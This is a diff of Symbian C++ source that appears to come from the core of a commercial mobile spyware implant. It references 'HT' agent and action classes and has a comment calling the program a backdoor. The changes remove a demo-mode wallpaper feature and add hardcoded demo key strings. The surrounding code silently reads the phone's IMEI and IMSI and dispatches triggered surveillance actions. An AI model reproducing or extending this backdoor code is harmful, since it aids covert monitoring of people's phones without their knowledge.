@@ -3,7 +3,6 @@
 #include <e32base.h>
 #include <e32std.h>
 #include <bautils.h>
-#include <aknswallpaperutils.h>
 #include <coemain.h>
 
 #include "Core.h"
@@ -23,6 +22,16 @@
 #include <HT\AbstractEvent.h>
 #include <HT\AbstractAgent.h>
 #include <HT\AbstractAction.h>
+
+
+//Demo key
+#ifdef _DEBUG
+_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmJO");
+#else
+_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmLE");
+#endif
+//CCITT CRC (16 bits, polynomial 0x1021 and initial value 0xffff) of "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+const TUint16 KCrcDemoKey=0xbd80; 
 
 TBuf<50>  iGlobalImei;
 TBuf<15>  iGlobalImsi;
@@ -50,18 +59,11 @@ CCore::~CCore()
 	delete iConfig;
 	delete iFreeSpaceMonitor;
 	
-	//TODO: activate this in 8.0
 	if(iDemoVersion)
 		{
-		delete iWallpaper;
 		delete iTonePlayer;
 		}
-	/*
-#ifdef _DEMO  //TODO: delete this in 8.0
-	delete iWallpaper;
-	delete iTonePlayer;
-#endif
-*/
+	
 	iFs.Close();
 	RProperty::Delete(KPropertyUidCore,KPropertyFreeSpaceThreshold);
 	RProperty::Delete(KPropertyUidCore,KPropertyStopSubactions);
@@ -93,23 +95,16 @@ void CCore::ConstructL()
 	else
 		iDemoVersion = EFalse;
 	
+	if(iDemoVersion)
+		{
+		iTonePlayer = CTonePlayer::NewL();
+		}
+		
 	CPhone* phone = CPhone::NewLC();
 	phone->GetImeiSync(iGlobalImei);
 	phone->GetImsiSync(iGlobalImsi);
 	CleanupStack::PopAndDestroy();
 	
-	//TODO: activate this in 8.0
-	if(iDemoVersion)
-		{
-		iWallpaper = CWallpaperSticker::NewL();
-		iTonePlayer = CTonePlayer::NewL();
-		}
-	/*
-#ifdef _DEMO  //TODO: delete this in 8.0
-	iWallpaper = CWallpaperSticker::NewL();
-	iTonePlayer = CTonePlayer::NewL();
-#endif
-	*/
 	__FLOG(_L("End ConstructL"));
 	}
 
@@ -429,16 +424,11 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 	{
 	ASSERT( aCommand.iType == ENotify );
 
-	//TODO: activate this in 8.0
 	if(iDemoVersion)
 		{
 		iTonePlayer->Play();
 		}
-	/*
-#ifdef _DEMO  //TODO: delete this in 8.0
-	iTonePlayer->Play();
-#endif
-*/
+	
 	// This is an "Event Triggered" Notification...
 	// Gets the id of the macro action to execute...
 	TInt macroIdx = aCommand.iSrc;
@@ -521,18 +511,6 @@ void CCore::StartMonitorFreeSpace()
 		RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 1);
 		}
 	iFreeSpaceMonitor->StartListeningForEvents();
-	}
-
-
-void CCore::ChangeWallpaper()
-	{
-	TInt err = AknsWallpaperUtils::SetIdleWallpaper(KWallpaperImage, CCoeEnv::Static());
-	if(err != KErrNone)
-		{
-		// if the configured image can't be loaded, backdoor is stopped
-		CActiveScheduler::Stop();
-		}
-	iWallpaper->Start();
 	}
 
 
@@ -644,17 +622,6 @@ LOCAL_C void DoStartL()
 	//start free space monitor
 	core->StartMonitorFreeSpace();
 	
-	//TODO: activate this in 8.0
-	if(core->DemoVersion())
-		{
-		core->ChangeWallpaper();
-		}
-	/*
-#ifdef _DEMO  //TODO: delete this in 8.0
-	//change wallpaper
-	core->ChangeWallpaper();
-#endif
-	*/
 	CActiveScheduler::Start();  
 	CleanupStack::PopAndDestroy(core);
 	// Delete active scheduler
